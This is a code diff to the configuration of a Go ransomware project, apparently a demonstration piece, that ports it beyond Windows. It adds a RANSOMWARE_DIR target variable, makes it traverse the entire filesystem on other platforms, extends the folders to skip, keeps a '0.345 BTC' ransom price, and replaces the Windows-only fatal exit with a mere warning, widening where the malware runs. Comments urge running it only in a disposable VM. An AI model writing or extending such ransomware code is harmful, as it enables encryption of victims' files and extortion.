@@ -12,29 +12,55 @@ import (
 )
 
 var (
-	UserDir = fmt.Sprintf("%s\\", utils.GetCurrentUser().HomeDir)
+	UserDir = fmt.Sprintf("%s%c", utils.GetCurrentUser().HomeDir, os.PathSeparator)
 
 	// Temp Dir
-	TempDir = fmt.Sprintf("%s\\", os.Getenv("TEMP"))
+	TempDir = fmt.Sprintf("%s%c", os.TempDir(), os.PathSeparator)
 
 	// Directories to walk searching for files
-	// By default it will walk throught all available drives
-	InterestingDirs = utils.GetDrives()
+	// A single folder can be targeted on any platform with the
+	// RANSOMWARE_DIR env var. Without it, on windows the malware walks
+	// through all available drives, and on other platforms it walks the
+	// entire filesystem (virtual/device dirs are excluded via SkippedDirs).
+	// Only run the whole-filesystem mode inside a disposable VM!
+	InterestingDirs = func() []string {
+		if dir := os.Getenv("RANSOMWARE_DIR"); dir != "" {
+			return []string{dir}
+		}
+		if runtime.GOOS == "windows" {
+			return utils.GetDrives()
+		}
+		return []string{"/"}
+	}()
 
 	// Folders to skip
-	SkippedDirs = []string{
-		"ProgramData",
-		"Windows",
-		"bootmgr",
-		"$WINDOWS.~BT",
-		"Windows.old",
-		"Temp",
-		"tmp",
-		"Program Files",
-		"Program Files (x86)",
-		"AppData",
-		"$Recycle.Bin",
-	}
+	SkippedDirs = func() []string {
+		dirs := []string{
+			"ProgramData",
+			"Windows",
+			"bootmgr",
+			"$WINDOWS.~BT",
+			"Windows.old",
+			"Temp",
+			"tmp",
+			"Program Files",
+			"Program Files (x86)",
+			"AppData",
+			"$Recycle.Bin",
+		}
+		if runtime.GOOS != "windows" {
+			// On other platforms, skip virtual filesystems and device
+			// nodes: encrypting /dev would destroy the VM disk, and
+			// walking /proc or /sys can hang the process.
+			dirs = append(dirs,
+				"proc", "sys", "dev", "run", "boot", "snap", "lost+found",
+				// VirtualBox shared folders are mounted as sf_<name>;
+				// skipping them protects the host machine
+				"sf_",
+			)
+		}
+		return dirs
+	}()
 
 	// Interesting extensions to match files
 	InterestingExtensions = []string{
@@ -108,9 +134,9 @@ var (
 	Price = "0.345 BTC"
 )
 
-// Execute only on windows
+// CheckOS warn when the demo runs outside windows
 func CheckOS() {
 	if runtime.GOOS != "windows" {
-		Logger.Fatalln("Sorry, but your OS is currently not supported. Try again with a windows machine")
+		Logger.Println("Warning: this demo was originally designed for windows, but you are running on", runtime.GOOS)
 	}
 }
